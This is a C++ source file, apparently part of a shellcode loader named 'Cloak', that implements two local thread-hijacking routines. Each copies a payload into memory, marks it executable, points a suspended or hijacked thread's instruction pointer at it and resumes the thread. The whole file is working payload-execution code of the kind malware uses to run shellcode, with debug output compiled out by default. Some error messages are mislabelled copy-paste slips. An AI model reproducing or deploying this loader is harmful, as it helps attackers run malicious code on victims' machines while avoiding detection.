#include "Cloak.hpp"

#ifdef LOCAL_THREAD_HIJACK

VOID GottaCatchEmAll() {
    int i = rand();
    int j = rand();
    int k = i + j;
    int l = k * i / j;
}

BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    DWORD   dwOldProtect        = NULL;
    PVOID   pPayloadAddress     = NULL;
    HANDLE  hThread             = NULL;
    CONTEXT cThreadContext      = { .ContextFlags = CONTEXT_CONTROL };

    hThread = CreateThread( NULL, NULL, ( LPTHREAD_START_ROUTINE ) &GottaCatchEmAll, NULL, CREATE_SUSPENDED, NULL );
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] CreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = VirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    if ( ! GetThreadContext( hThread, &cThreadContext ) ) {
        #ifdef DEBUG
        printf( "[-] GetThreadContext Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    cThreadContext.Rip = ( DWORD64 ) pPayloadAddress;

    if ( ! SetThreadContext( hThread, &cThreadContext ) ) {
        #ifdef DEBUG
        printf( "[-] SetThreadContext Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    ResumeThread( hThread );

    WaitForSingleObject( hThread, WAIT_TIME );

    return TRUE;
}

#endif // !LOCAL_THREAD_HIJACK

#ifdef LOCAL_THREAD_HIJACK_ENUM

#include <tlhelp32.h>

BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    DWORD           dwMainThread        = NULL;
    DWORD           dwTargetThread      = NULL;
    HANDLE          hThread             = NULL;
    PVOID           pPayloadAddress     = NULL;
    DWORD           dwPid               = GetCurrentProcessId();
    DWORD           dwOldProtect        = NULL;
    HANDLE          hSnapshot           = NULL;
    THREADENTRY32   teThread            = { .dwSize = sizeof( THREADENTRY32 ) };
    CONTEXT         cThreadContext      = { .ContextFlags = CONTEXT_CONTROL };


    dwMainThread = GetCurrentThreadId();

    hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, NULL );
    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        #ifdef DEBUG
        printf( "[-] CreateToolhelp32Snapshot Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        return FALSE;
    }

    if ( ! Thread32First( hSnapshot, &teThread ) ) {
        #ifdef DEBUG
        printf( "[-] Thread32First Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        CloseHandle(hSnapshot);

        return FALSE;
    }

    do {

        if ( teThread.th32OwnerProcessID == dwPid && teThread.th32ThreadID != dwMainThread ) {

            dwTargetThread = teThread.th32ThreadID;
            hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, teThread.th32ThreadID );
            if ( hThread == NULL ) {
                #ifdef DEBUG
                printf( "[-] OpenThread Failed with Error -> %d\n", GetLastError() );
                #endif // !DEBUG

                CloseHandle(hSnapshot);

                return FALSE;
            }

            break;

        }

    } while ( Thread32Next( hSnapshot, &teThread ) );

    CloseHandle(hSnapshot);

    if (dwTargetThread == NULL || hThread == NULL) {
	    return FALSE;
    }

    pPayloadAddress = VirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    SuspendThread( hThread );

    if ( ! GetThreadContext( hThread, &cThreadContext ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    cThreadContext.Rip = ( DWORD64 ) pPayloadAddress;

    if ( ! SetThreadContext( hThread, &cThreadContext ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    ResumeThread( hThread );

    WaitForSingleObject( hThread, WAIT_TIME );

    return TRUE;
}

#endif // !LOCAL_THREAD_HIJACK_ENUM